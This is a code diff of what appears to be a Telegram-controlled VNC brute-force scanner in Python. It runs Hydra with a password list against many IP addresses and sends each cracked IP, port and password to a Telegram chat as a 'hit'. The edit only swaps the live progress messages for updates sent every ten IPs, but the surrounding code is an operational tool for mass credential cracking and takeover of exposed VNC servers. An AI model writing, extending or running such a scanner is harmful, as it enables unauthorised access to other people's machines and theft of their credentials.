@@ -127,26 +127,6 @@ def send_message_sync(context, chat_id, message):
         print(f"Error sending message: {e}")
         return False
 
-def edit_message_sync(context, chat_id, message_id, message):
-    """Edit message synchronously from thread"""
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        loop.run_until_complete(
-            context.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=message,
-                parse_mode='HTML'
-            )
-        )
-        loop.close()
-        return True
-    except Exception as e:
-        print(f"Error editing message: {e}")
-        return False
-
 def send_hit(context, chat_id, ip, port, password):
     """Send found credential immediately"""
     message = (
@@ -160,7 +140,7 @@ def send_hit(context, chat_id, ip, port, password):
     send_message_sync(context, chat_id, message)
 
 def run_scan(context, chat_id, max_ips=None):
-    """Run the VNC scan with live progress updates
+    """Run the VNC scan with simple progress updates
     
     Args:
         context: Bot context
@@ -178,7 +158,6 @@ def run_scan(context, chat_id, max_ips=None):
         scan_status['found'] = 0
         scan_status['hits'] = []
     
-    progress_message_id = None
     last_update_time = time.time()
     
     try:
@@ -221,32 +200,9 @@ def run_scan(context, chat_id, max_ips=None):
             f"⚙️ Threads: 4\n"
             f"⏱ Timeout: 60s per IP\n"
             f"⏰ Started: {datetime.now().strftime('%H:%M:%S')}\n\n"
-            f"Live updates every 3 seconds! 📊"
+            f"Progress updates every 10 IPs! 📊"
         )
         send_message_sync(context, chat_id, start_msg)
-        
-        # Send initial progress message
-        initial_progress = (
-            f"📊 <b>LIVE PROGRESS</b>\n\n"
-            f"✅ Checked: 0/{len(ips)} (0.0%)\n"
-            f"🎯 Hits Found: 0\n"
-            f"⏱ Elapsed: 0.0 min\n"
-            f"⏳ ETA: Calculating...\n"
-            f"🔄 Current: Starting..."
-        )
-        
-        # Send progress message and get message_id
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        msg = loop.run_until_complete(
-            context.bot.send_message(
-                chat_id=chat_id,
-                text=initial_progress,
-                parse_mode='HTML'
-            )
-        )
-        progress_message_id = msg.message_id
-        loop.close()
         
         # Initialize output file
         with open(OUTPUT_FILE, 'w') as f:
@@ -280,34 +236,7 @@ def run_scan(context, chat_id, max_ips=None):
             if idx <= 3:
                 send_message_sync(context, chat_id, f"🔍 Checking IP {idx}/{len(ips)}: {ip}:{port}")
             
-            # Update progress every 3 seconds
-            current_time = time.time()
-            if current_time - last_update_time >= 3:
-                progress = (idx / len(ips)) * 100
-                elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
-                
-                if idx > 0:
-                    eta_total = (elapsed / idx) * len(ips)
-                    eta_remaining = eta_total - elapsed
-                    eta_str = f"{eta_remaining/60:.1f} min"
-                else:
-                    eta_str = "Calculating..."
-                
-                progress_msg = (
-                    f"📊 <b>LIVE PROGRESS</b>\n\n"
-                    f"✅ Checked: {idx}/{len(ips)} ({progress:.1f}%)\n"
-                    f"🎯 Hits Found: {scan_status['found']}\n"
-                    f"⏱ Elapsed: {elapsed/60:.1f} min\n"
-                    f"⏳ ETA: {eta_str}\n"
-                    f"🔄 Current: {ip}:{port}"
-                )
-                
-                if progress_message_id:
-                    edit_message_sync(context, chat_id, progress_message_id, progress_msg)
-                
-                last_update_time = current_time
-            
-            # Check VNC (reduced timeout for faster scanning)
+            # Check VNC
             check_start = time.time()
             success, result = check_vnc_with_hydra(ip, port, PASS_FILE, 4, timeout_sec=60)
             check_duration = time.time() - check_start
@@ -335,39 +264,31 @@ def run_scan(context, chat_id, max_ips=None):
                 
                 # Send immediate notification
                 send_hit(context, chat_id, ip, port, result)
-                
-                # Update progress immediately after hit
-                progress = (idx / len(ips)) * 100
-                elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
-                eta_total = (elapsed / idx) * len(ips)
-                eta_remaining = eta_total - elapsed
-                
-                progress_msg = (
-                    f"📊 <b>LIVE PROGRESS</b>\n\n"
-                    f"✅ Checked: {idx}/{len(ips)} ({progress:.1f}%)\n"
-                    f"🎯 Hits Found: {scan_status['found']} 🔥\n"
-                    f"⏱ Elapsed: {elapsed/60:.1f} min\n"
-                    f"⏳ ETA: {eta_remaining/60:.1f} min\n"
-                    f"🔄 Current: {ip}:{port}"
-                )
-                
-                if progress_message_id:
-                    edit_message_sync(context, chat_id, progress_message_id, progress_msg)
-                
-                last_update_time = time.time()
             
             scan_status['checked'] = idx
-        
-        # Final progress update
-        progress_msg = (
-            f"📊 <b>SCAN COMPLETE!</b>\n\n"
-            f"✅ Checked: {scan_status['checked']}/{scan_status['total_ips']} (100%)\n"
-            f"🎯 Hits Found: {scan_status['found']}\n"
-            f"⏱ Total Time: {(datetime.now() - scan_status['start_time']).total_seconds()/60:.1f} min"
-        )
-        
-        if progress_message_id:
-            edit_message_sync(context, chat_id, progress_message_id, progress_msg)
+            
+            # Send progress update every 10 IPs
+            if idx % 10 == 0 or idx == len(ips):
+                progress = (idx / len(ips)) * 100
+                elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
+                
+                if idx > 0:
+                    eta_total = (elapsed / idx) * len(ips)
+                    eta_remaining = eta_total - elapsed
+                    eta_str = f"{eta_remaining/60:.1f} min"
+                else:
+                    eta_str = "Calculating..."
+                
+                progress_msg = (
+                    f"📊 <b>PROGRESS UPDATE</b>\n\n"
+                    f"✅ Checked: {idx}/{len(ips)} ({progress:.1f}%)\n"
+                    f"🎯 Hits Found: {scan_status['found']}\n"
+                    f"⏱ Elapsed: {elapsed/60:.1f} min\n"
+                    f"⏳ ETA: {eta_str}\n"
+                    f"🔄 Last: {ip}:{port}"
+                )
+                
+                send_message_sync(context, chat_id, progress_msg)
         
         # Final summary
         elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
